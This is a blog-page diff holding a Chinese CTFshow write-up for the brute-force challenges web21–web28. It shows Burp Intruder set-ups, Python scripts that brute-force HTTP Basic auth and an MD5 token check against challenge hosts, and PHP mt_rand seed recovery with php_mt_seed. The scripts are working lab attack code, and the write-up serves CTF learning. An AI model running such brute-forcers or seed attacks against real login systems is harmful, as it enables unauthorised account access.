@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web入门_爆破 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="然后进行一个爆破">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web入门_爆破">
+<meta property="og:url" content="https://4reexile.github.io/article/ctfshow-webbasic-baopo/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="然后进行一个爆破">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-07-02T14:22:45.000Z">
+<meta property="article:modified_time" content="2024-07-05T11:08:08.822Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="工具利用">
+<meta property="article:tag" content="爆破">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/ctfshow-webbasic-baopo/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Web入门_爆破',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-05 19:08:08'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Web入门_爆破</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-02T14:22:45.000Z" title="Created 2024-07-02 22:22:45">2024-07-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-05T11:08:08.822Z" title="Updated 2024-07-05 19:08:08">2024-07-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow%E9%9D%B6%E5%9C%BA/">ctfshow靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.4k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>爆破</h1>
+<hr>
+<h2 id="web21"><a class="header-anchor" href="#web21">¶</a>web21</h2>
+<ul>
+<li>描述: 爆破什么的，都是基操</li>
+</ul>
+<p>抓包可以发现有<code>Authorization</code>字段, 将后面进行base64解码可以得到刚输入的账号密码, 格式为<code>admin:admin</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">sec-ch-ua: &quot;;Not A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;88&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br></pre></td></tr></table></figure>
+<p>首先利用burp在<code>Positions</code>界面添加爆破点(反正我是这么叫的)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702180550029.png" alt="image-20240702180550029"></p>
+<p>然后在<code>Payloads</code>界面的<code>Payload Sets -&gt; Payload type</code>选择&quot;Custom iterator&quot;, 在下面的<code>Payload Options[Custom iterator]</code>中分别设置:</p>
+<ul>
+<li>Position:1  admin</li>
+<li>Position:2  :</li>
+<li>Position:3  密码字典</li>
+</ul>
+<blockquote>
+<p>就是构建 admin:密码 的爆破payload</p>
+</blockquote>
+<p>然后在<code>Payload Precessing</code>增加一个base64加密, 如下, 然后取消勾选最底下的<code>URL-encode these characters</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702181449975.png" alt="image-20240702181449975"></p>
+<p>最后点击<code>Start attack</code>即可, 爆破出来是<code>admin:shark63</code></p>
+<p>脚本也是一个不错的选择:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2020-11-20 19:16:49</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-11-20 20:28:42</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"><span class="comment"># URL换成实际的靶场网址</span></span><br><span class="line"></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用字典</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	    data = f.readline() </span><br><span class="line">	    <span class="keyword">if</span> data:</span><br><span class="line">	    	password.append(data)</span><br><span class="line">	    <span class="keyword">else</span>:</span><br><span class="line">	      <span class="keyword">break</span></span><br><span class="line">	    </span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">	strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]</span><br><span class="line">	header=&#123;</span><br><span class="line">		<span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(strs.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	&#125;</span><br><span class="line">	rep =requests.get(url,headers=header)</span><br><span class="line">	time.sleep(<span class="number">0.2</span>)</span><br><span class="line">	<span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:</span><br><span class="line">		<span class="built_in">print</span>(rep.text)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="web22"><a class="header-anchor" href="#web22">¶</a>web22</h2>
+<ul>
+<li>描述: 域名也可以爆破的，试试爆破这个ctf.show的子域名</li>
+</ul>
+<p>一般可以用在线子域名挖掘或者本地的子域名挖掘机</p>
+<h2 id="web23"><a class="header-anchor" href="#web23">¶</a>web23</h2>
+<ul>
+<li>描述: 还爆破？这么多代码，告辞！</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>分析代码: token被 md5 加密, 且它的<code>第一位 = 第十四位 = 第十七位</code>, 化为整数后<code>(第一位 + 第十四位 + 第十七位) / 第一位 = 第三十一位</code>则可获得 flag, 无脑遍历算了, 先试试两个位置的, 结果真爆出来了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        url = <span class="string">&quot;https://669fe72a-3524-4044-96f5-670a7732e87f.challenge.ctf.show/?token=&quot;</span> + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j)</span><br><span class="line">        req = requests.get(url=url).text</span><br><span class="line">        <span class="comment"># 使用requests库中的get方法来获取指定url的内容，并返回该内容的文本形式。</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;the flag is:&quot;</span> + req + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;the poc is:&quot;</span> + url)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now try:&quot;</span> + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j))</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<h2 id="web24"><a class="header-anchor" href="#web24">¶</a>web24</h2>
+<ul>
+<li>描述: 爆个🔨</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>伪随机数还给了种子, 这还不会爆? 传值即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="comment">// 1155388967</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="web25"><a class="header-anchor" href="#web25">¶</a>web25</h2>
+<ul>
+<li>描述: 爆个🔨，不爆了</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>种子涉及到flag, 不能直接求到, 而<code>if((!$rand))</code> 要使这个为真，就要让 <code>$rand=0</code>
+而 <code>$rand = intval($r)-intval(mt_rand())</code> , 所以要得到随机数才能构造 <code>$r=$mt_rand()</code></p>
+<p>我挺不理解怎么敢写<code>echo $rand;</code>的, 传入r=0可以得到随机数的相反数-243274477 (每个人似乎不同)</p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">php_mt_seed</a>解压到linux系统(用的kali, windows没试过), 本目录下执行<code>make</code>,会多出一个可执行文件php_mt_seed, 然后执行<code>./php_mt_seed 243274477</code>即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702201207167.png" alt="image-20240702201207167"></p>
+<p>这就需要写一个 php 脚本来测试是哪个种子第一次就得到这个随机数, 然后对其中一个可能的种子请求两次并求和得到 token 的值, 都拿到了, 就可以传入对应的r和token了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span> = <span class="number">1162957153</span>;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span> = <span class="number">3045777377</span>;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$a1</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="variable">$a2</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="variable">$a3</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a1</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a2</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a3</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$a2</span> + <span class="variable">$a3</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="web26"><a class="header-anchor" href="#web26">¶</a>web26</h2>
+<ul>
+<li>描述: 这个可以爆</li>
+</ul>
+<p>这个进去之后是安装界面, 在点击&quot;确认无误, 开始安装&quot;后对返回包进行抓包就能拿下flag</p>
+<p>或者先填入默认信息, 然后对pass进行爆破,爆破得到密码7758521</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702213427481.png" alt="image-20240702213427481"></p>
+<h2 id="web27"><a class="header-anchor" href="#web27">¶</a>web27</h2>
+<ul>
+<li>描述: CTFshow菜鸡学院招生啦！</li>
+</ul>
+<p>登录界面可以下载到录取名单, 然后还有一个&quot;学生学籍信息查询系统&quot;; 下载下来的list中有姓名和部分身份证号(缺少日期), 应该就是利用爆破爆破出身份证号获得或者重置密码</p>
+<p>burp自带日期爆破, 选择然后设置格式就好了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702220146056.png" alt="image-20240702220146056"></p>
+<p>爆破出来的结果: 高先伊  621022199002015237  学号02015237  密码为身份证号, 登录拿到flag</p>
+<h2 id="web28"><a class="header-anchor" href="#web28">¶</a>web28</h2>
+<ul>
+<li>描述: 大海捞针</li>
+</ul>
+<p>后缀是<code>/0/1/2.txt</code>, 无论怎么修改2.txt部分都会演变为无限重定向, 只能对前两个数字进行爆破</p>
+<p>在传参处增加两个爆破点, <code>Attack type</code>选择&quot;Cluster bomb&quot;</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702221733584.png" alt="image-20240702221733584"></p>
+<p><code>Payload type</code>选择Number, 填写1-100, 两个爆破点是分开设置的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702221844411.png" alt="image-20240702221844411"></p>
+<p>爆破得到结果为<code>/72/20/</code>, 访问得到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/ctfshow-webbasic-baopo/">https://4reexile.github.io/article/ctfshow-webbasic-baopo/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" 